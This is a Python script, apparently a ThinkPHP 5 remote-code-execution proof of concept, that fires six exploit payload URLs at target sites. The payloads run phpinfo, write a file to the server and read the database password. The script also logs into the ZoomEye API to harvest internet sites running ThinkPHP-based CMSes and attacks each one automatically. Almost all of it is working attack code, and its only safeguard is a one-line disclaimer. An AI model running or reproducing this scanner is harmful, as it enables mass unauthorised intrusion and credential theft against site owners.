# -*- conding:utf-8 -*- 
"""
    Author:sunu11
    Blog: http://www.sunu11.com
"""
import sys
import requests
import json
import jsonpath
import re
import time

def doAttack(url): #After getting the test url, start sending payloads to test and output
	i = 0
	tag = False
	URL = url
	headers={'user-agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Mobile Safari/537.36',
	'referer':'http://baidu.com'}
	payloads = {
		0:r"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
		1:r"/?s=index/\think\Request/input&filter=phpinfo&data=1",
		2:r"/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
		3:r"/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E",
		4:r"/?s=index/\think\template\driver\file/write&cacheFile=1m2b38.txt&content=phpinfo",
		5:r"?s=./think\config/get&name=database.password"
		}
	if re.match(r'^https?:/{2}\w.+$', url):
		pass
	else:
		url = 'http://' + url
	URL2 = url
	if 'index.php' not in url:
		URL = url + '/index.php'
	while i < 6:
		if not tag:
			try:
				url = URL + payloads.get(i)
				if i < 4:
					r= requests.get(url=url,headers=headers)
					if "phpinfo" in r.text:
						tag = True
				elif i == 4:
					r2 = requests.get(url=url, headers=headers)
					r3 = requests.get(URL2+'/1m2b38.txt')# check vuln
					if "phpinfo" in r3.text: 
						tag = True
				elif i ==5:
					r4 = requests.get(url=url, headers=headers)
					if len(r4.text) > 0 and len(r4.text) < 20:
						tag = True
						i = i +4
			except Exception as e:
				print ("connect error or domains errer")
		else:
			break
		i = i+1
	if i == 6:
		print ("[-] {} is not vulnerable".format(URL))
	elif i == 10:
		s = "[+] {} is vulnerable\n[+] Payload is {}".format(URL,payloads.get(i-5))
		print (s)
		with open("result.txt",'a+') as f:
			f.write(s+"\n")
	else:
		s2 = "[+] {} is vulnerable\n[+] Payload is {}".format(URL,payloads.get(i-1))
		print (s2)
		with open("result.txt",'a+') as z:
			z.write(s2+"\n")
def auto_Getdomain():#Get suspicious urls at www.zoomeye.org
	getJwt = True
	while getJwt:
		try:
			name = input("zoomeye username:")
			password = input("zoomeye password:")
			data = {"username":name,"password":password}
			url='https://api.zoomeye.org/user/login'
			reqgetJwt = requests.post(url = url, data =json.dumps(data)) #json.dumps: Encode Python objects into JSON strings
			Jwt = json.loads(reqgetJwt.text)['access_token']
			header={
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36",
			"Authorization": "JWT "+ Jwt
			}
			getJwt = False
		except Exception as e:
			print ("Account password input error\n plz input u zoomeye account")

	apps=['AdminLTE','QiboCMS','layui','thinkcmf','H-ui.admin','tpshop','FsatAdmin','thinkphp','eyoucms','LarryCMS','tpadmin','snake','ThinkSNS','DolphinPHP','WeMall','CLTPHP','DSMALL','YFCMF','HisiPHP','Tplay','lyadmin','haoid']
	for app in apps:
		print (app)
		for x in range(1,5):#get domains pages(1-*)
			try:
				url = "https://api.zoomeye.org/web/search?query=app:"+app+"&page=" +str(x)
				data = requests.get(url=url,headers=header)
				data = data.text.encode('utf-8')
				if len(data) > 60:
					jsondata = json.loads(data)				
					urldata = jsonpath.jsonpath(jsondata,'$..site')
					for ddaa in urldata:
						doAttack(ddaa)
			except Exception as e:
				print (e)
def batch_target(file):	#get url by target.txt
	with open(file,'r+') as f:
		targets = f.readlines()
	for t in targets:
		try:
			t = t.split('\n')[0]
			print ("Testing\n"+ t)
			doAttack(t)
		except:
			pass
def banner():
	print("""Thinkphpv5 RCE POC
		Author: Admintony @ 2018.12
		Blog: http://www.sunu11.com
		Disclaimer: The script is only used to check the site for vulnerabilities. Do not use it for illegal purposes, otherwise the author will not be responsible for it.
		usage:
		Tp-Test.py -f target.txt # Bulk detection for the existence of thinkPHP code execution vulnerability
		Tp-Test.py -u target_URL # Specifies to detect if there is a thinkPHP code execution vulnerability
		Tp-Test.py -o # Use zoomeye to automatically test Internet vulnerabilities and statistical output
		""")
if __name__ == '__main__':
	if len(sys.argv) == 3 or len(sys.argv) == 2:
		print ('start!!!')	
	else:
		banner()
		exit()
	if sys.argv[1]=='-f':
		batch_target(sys.argv[2])
	elif sys.argv[1]=='-u':
		doAttack(sys.argv[2])
	elif sys.argv[1] == '-o':
		print ("plz input u zoomeye account")
		auto_Getdomain()
